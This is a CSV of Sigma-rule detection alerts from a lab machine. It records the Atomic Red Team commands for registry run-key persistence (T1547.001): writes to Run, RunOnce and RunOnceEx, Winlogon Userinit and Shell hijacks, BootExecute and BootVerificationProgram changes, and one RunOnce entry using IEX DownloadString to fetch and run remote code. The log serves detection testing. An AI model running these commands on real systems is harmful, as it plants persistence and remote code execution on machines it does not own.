"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-26 11:19:13.697 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173626,"Cmdline: ""powershell.exe"" & {if (!(Test-Path -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""")){ New-Item -ItemType Key -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" } Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" -Name \""""atomictest\"""" -Value \""""C:\Windows\System32\calc.exe\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 2424 ¦ PGUID: E9F06A57-6121-694E-9401-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {if (!(Test-Path -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""")){ New-Item -ItemType Key -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" } Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" -Name \""""atomictest\"""" -Value \""""C:\Windows\System32\calc.exe\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:13.680","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:16.429 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173629,"Cmdline: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""" C:\Windows\System32\calc.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\"""" -Value \""""$newvalue\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6056 ¦ PGUID: E9F06A57-6124-694E-9601-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""" C:\Windows\System32\calc.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\"""" -Value \""""$newvalue\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:16.419","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.103 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173633,"Cmdline: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""", C:\Windows\explorer.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\"""" -Value \""""$newvalue\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""", C:\Windows\explorer.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\"""" -Value \""""$newvalue\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:17.088","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.455 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173641,"Cmdline: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1456 ¦ PGUID: E9F06A57-6126-694E-9E01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:18.441","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.443 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173613,"Cmdline: ""powershell.exe"" & {$RunKey = \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\"""" Set-ItemProperty -Path $RunKey -Name \""""socks5_powershell\"""" -Value \""""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8680 ¦ PGUID: E9F06A57-611B-694E-8C01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunKey = \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\"""" Set-ItemProperty -Path $RunKey -Name \""""socks5_powershell\"""" -Value \""""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:07.428","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.928 +01:00","Suspicious PowerShell Download and Execute Pattern","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173564,"Cmdline: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.675","proc_creation_win_powershell_susp_download_patterns.yml","32266c6c-b44a-9ae2-9d4a-728b6d52a30d","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:45.379 +01:00","Potential Persistence Attempt Via Run Keys Using Reg.EXE","med","DESKTOP-G2OBL3D","Sysmon",1,"PrivEsc ¦ Persis","T1547.001","sysmon",173559,"Cmdline: REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 2516 ¦ PGUID: E9F06A57-6105-694E-6B01-000000002400 ¦ ParentPID: 6604 ¦ ParentPGUID: E9F06A57-6105-694E-6901-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:45.371","proc_creation_win_reg_add_run_key.yml","7f2f1ee8-50e3-cffb-315b-824441de4f87","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.420 +01:00","Potential Persistence Attempt Via Run Keys Using Reg.EXE","med","DESKTOP-G2OBL3D","Sysmon",1,"PrivEsc ¦ Persis","T1547.001","sysmon",173562,"Cmdline: REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\AtomicRedTeam.dll"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\AtomicRedTeam.dll"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1804 ¦ PGUID: E9F06A57-6109-694E-6E01-000000002400 ¦ ParentPID: 840 ¦ ParentPGUID: E9F06A57-6109-694E-6C01-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.413","proc_creation_win_reg_add_run_key.yml","7f2f1ee8-50e3-cffb-315b-824441de4f87","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:45.379 +01:00","Direct Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",1,"PrivEsc ¦ Persis","T1547.001","sysmon",173559,"Cmdline: REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 2516 ¦ PGUID: E9F06A57-6105-694E-6B01-000000002400 ¦ ParentPID: 6604 ¦ ParentPGUID: E9F06A57-6105-694E-6901-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:45.371","proc_creation_win_reg_direct_asep_registry_keys_modification.yml","7564e582-322d-e013-3391-edf2f6dfbb20","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.420 +01:00","Direct Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",1,"PrivEsc ¦ Persis","T1547.001","sysmon",173562,"Cmdline: REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\AtomicRedTeam.dll"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\AtomicRedTeam.dll"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1804 ¦ PGUID: E9F06A57-6109-694E-6E01-000000002400 ¦ ParentPID: 840 ¦ ParentPGUID: E9F06A57-6109-694E-6C01-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.413","proc_creation_win_reg_direct_asep_registry_keys_modification.yml","7564e582-322d-e013-3391-edf2f6dfbb20","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.846 +01:00","Dumping of Sensitive Hives Via Reg.EXE","high","DESKTOP-G2OBL3D","Sysmon",1,"CredAccess","T1003.002 ¦ T1003.004 ¦ T1003.005","car.2013-07-001 ¦ sysmon",173643,"Cmdline: ""C:\WINDOWS\system32\reg.exe"" export ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg /y ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7208 ¦ PGUID: E9F06A57-6126-694E-A001-000000002400 ¦ ParentPID: 1456 ¦ ParentPGUID: E9F06A57-6126-694E-9E01-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentCommandLine: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:18.839","proc_creation_win_reg_dumping_sensitive_hives.yml","70968431-a84d-2f9d-00d5-5164c7a25d9c","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.445 +01:00","Potential Persistence Attempt Via Existing Service Tampering","med","DESKTOP-G2OBL3D","Sysmon",1,"PrivEsc ¦ Evas ¦ Persis","T1543.003 ¦ T1574.011","sysmon",173647,"Cmdline: ""cmd.exe"" /c reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6660 ¦ PGUID: E9F06A57-6127-694E-A401-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.435","proc_creation_win_sc_service_tamper_for_persistence.yml","bdaddd46-5790-85bc-afc9-e60186bbc43c","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.490 +01:00","Potential Persistence Attempt Via Existing Service Tampering","med","DESKTOP-G2OBL3D","Sysmon",1,"PrivEsc ¦ Evas ¦ Persis","T1543.003 ¦ T1574.011","sysmon",173648,"Cmdline: reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7472 ¦ PGUID: E9F06A57-6127-694E-A601-000000002400 ¦ ParentPID: 6660 ¦ ParentPGUID: E9F06A57-6127-694E-A401-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.480","proc_creation_win_sc_service_tamper_for_persistence.yml","bdaddd46-5790-85bc-afc9-e60186bbc43c","C:\Tools\Logs\art_1547_001.evtx"
